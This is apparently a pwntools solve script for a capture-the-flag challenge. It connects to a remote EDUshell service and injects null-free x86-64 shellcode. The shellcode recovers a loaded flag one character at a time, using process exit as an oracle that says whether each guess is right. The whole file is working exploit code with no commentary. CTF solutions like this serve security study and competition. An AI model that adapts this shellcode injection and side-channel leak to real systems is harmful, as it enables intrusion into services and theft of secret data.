#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import os
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('/home/EDUshell/EDUshell')


class Shell:
    def __init__(self, proc):
        self.proc = proc

    def loadflag(self):
        self.proc.sendlineafter('$ ', b'loadflag')

    def exec(self, shellcode: bytes):
        self.proc.sendline(b'exec ' + shellcode)


def shellcode(byte_to_try, index):
    shellcode = asm('''
    mov rbx, r12
    sub bx, 4432
    add bx, 0x40e0

    ''' + 'inc rbx\n' * index +
    '''

    xor rdx, rdx
    add dl,  {}

    xor rax, rax
    mov al, byte ptr [rbx]

    cmp al, dl
    jne  wrong
    ret

wrong:
    xor rax, rax
    add al, 60
    syscall
'''.format(byte_to_try))

    assert b'\x00' not in shellcode
    log.info('shellcode: {}'.format(shellcode))
    return shellcode


def main():
    '''
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    s = Shell(proc)
    s.loadflag()
    s.exec(shellcode(ord('{'), 4))
    s.proc.recvall()
    #s.proc.interactive()
    '''

    for byte in range(32, 128):
        log.info('trying... {}'.format(chr(byte)))

        s = Shell(remote('eofqual.zoolab.org', 10101))
        s.loadflag()
        s.exec(shellcode(byte, 33))
        s.proc.recvall()


if __name__ == '__main__':
    main()
